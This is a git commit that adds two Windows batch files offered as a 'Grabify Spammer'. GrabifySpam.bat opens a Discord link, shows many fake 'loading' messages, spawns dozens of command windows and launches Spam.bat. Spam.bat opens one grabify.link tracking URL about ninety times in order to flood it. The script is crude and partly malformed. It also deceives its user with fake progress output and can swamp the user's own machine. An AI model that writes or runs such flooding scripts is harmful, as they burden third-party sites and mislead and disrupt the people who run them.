b88f5dcfa7fc707b4bc3f7eec95d9f4062b6b99a
impwned <86328891+coolguytdj@users.noreply.github.com>
2023-01-11 20:02:06 -0600

    Add files via upload

---
+++ GrabifySpam.bat
@@ -0,0 +1,144 @@
+@echo off
+start https://cdn.discordapp.com/attachments/1057169095730143312/1062909861865726074/image.png
+start https://discord.gg/triplenine
+echo Grabify Spammer
+echo Use at your own risk!
+echo Made by Archangel#9000, be sure to use vpn. Are you sure that you want to spam the website? It could crash your pc.
+set /p love=
+if %love%==yes goto love
+:love
+start Command Prompt.exe
+start Command Prompt.exe
+start Command Prompt.exe
+start Command Prompt.exe
+start Command Prompt.exe
+start Command Prompt.exe
+start Command Prompt.exe
+start Command Prompt.exe
+
+echo booting up spammer
+
+echo booting up spammer
+
+echo booting up spammer
+
+echo booting up spammer
+
+echo booting up spammer
+
+echo booting up spammer
+
+echo booting up spammer
+
+echo booting up spammer
+
+echo booting up spammer
+
+echo booting up spammer
+
+echo loading spammer tool
+
+echo loaded
+
+echo loading monkey.exe
+
+echo loading monkey.exe
+
+echo loading monkey.exe
+
+echo loading monkey.exe
+
+echo loading monkey.exe
+
+echo loading monkey.exe
+
+echo loading monkey.exe
+
+echo loading monkey.exe
+
+echo loading monkey.exe
+
+echo loading monkey.exe
+
+echo loading monkey.exe
+
+echo loading monkey.exe
+
+echo loading monkey.exe
+
+echo loading tools
+
+echo loading tools
+
+echo loading tools
+
+echo loading tools
+
+echo loading tools
+
+echo loading tools
+
+echo loading tools
+
+echo loading tools
+
+echo loading tools
+
+echo loading tools
+
+echo loading tools
+
+echo checking if your pc is able to run this file
+
+echo checking if your pc is able to run this file
+
+echo checking if your pc is able to run this file
+
+echo checking if your pc is able to run this file
+
+echo checking if your pc is able to run this file
+
+echo checking if your pc is able to run this file
+tryme.exe loaded
+echo checking if your pc is able to run this file
+check logs
+echo loaded
+vvvv
+echo loaded
+
+echo loaded
+
+echo loaded
+
+echo loaded
+
+echo loaded
+
+echo loaded
+
+echo loaded
+
+echo loaded
+timeout 10
+start Spam.bat
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
---
+++ Spam.bat
@@ -0,0 +1,186 @@
+@echo off
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+start https://grabify.link/EFTCSO
+
+
+start https://grabify.link/EFTCSO
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+v
+
+start https://grabify.link/EFTCSO
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
+start https://grabify.link/EFTCSO
+
+start https://grabify.link/EFTCSO
